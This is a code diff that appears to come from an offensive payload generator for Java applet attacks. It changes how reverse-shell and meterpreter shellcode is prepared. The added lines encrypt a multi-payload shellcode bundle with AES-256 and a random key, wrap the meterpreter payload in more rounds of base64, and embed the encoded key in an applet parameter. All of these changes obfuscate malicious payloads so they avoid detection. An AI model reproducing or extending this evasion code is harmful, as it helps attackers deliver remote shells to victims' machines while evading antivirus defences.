@@ -494,7 +494,6 @@ try:
 					print_status("Reverse Shell takes a few seconds to calculate..One moment..")
 					shellcode = generate_shellcode(choice9, choice2, portnum)
 
-
 				if choice1 == "shellcode/pyinject":
 					shellcode_port = portnum.replace("LPORT=", "")
 
@@ -509,7 +508,12 @@ try:
 				multipyinject_payload = multipyinject_payload[:-1]
 			# if we have multiple payloads, use multi injector
 			if choice1 == "shellcode/multipyinject":
-				shellcode = multipyinject_payload
+				# we first need to encrypt the payload via AES 256
+				# def encryptAES(secret, data):
+				print_status("Encrypting the shellcode via 256 AES encryption..")
+				secret = os.urandom(32)
+				shellcode = encryptAES(secret, multipyinject_payload)
+				print_status("Dynamic cipher key created and embedded into payload.")
 			filewrite = file("%s/src/program_junk/meterpreter.alpha_decoded" % (definepath), "w")
 			filewrite.write(shellcode)
 			filewrite.close()
@@ -534,8 +538,13 @@ try:
 		    	    data = base64.b64encode(data)
 		   	    # again 8
 		    	    data = base64.b64encode(data)
-		            # ok ok last time
+		            # 9
 		            data = base64.b64encode(data)
+			    # 10 
+			    data = base64.b64encode(data)
+			    # last one
+			    data = base64.b64encode(data)
+			    # 
 		    filewrite = file("%s/src/program_junk/meterpreter.alpha" % (definepath), "w")
 		    filewrite.write(data)
 		    filewrite.close()
@@ -568,6 +577,9 @@ try:
                         alpha_shellcode = fileopen2.read().rstrip()
                         data = fileopen.read()
                         data = data.replace('param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
+			if choice1 == "shellcode/multipyinject":
+				secret = base64.b64encode(secret)
+				data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
                         filewrite.write(data)
                         # close file
                         filewrite.close()
